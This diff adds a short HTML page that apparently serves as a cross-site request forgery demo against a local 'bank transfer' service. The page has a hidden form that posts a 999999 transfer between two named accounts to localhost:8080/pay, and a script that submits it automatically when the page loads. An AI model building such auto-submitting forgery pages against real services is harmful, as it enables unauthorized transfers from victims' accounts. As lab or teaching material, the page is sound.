@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XXX银行转账系统</title>
+</head>
+<body>
+
+<form method="post" action="http://localhost:8080/pay" id="formData">
+    <input type="hidden" name="from" value="李国毅"/><br>
+    <input type="hidden" name="money" value="999999"/><br>
+    <input type="hidden" name="to" value="刘乐平"/><br>
+</form>
+
+<script>
+window.onload=function (){
+    $("#formData").submit();
+}
+</script>
+<script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+</body>
+</html>
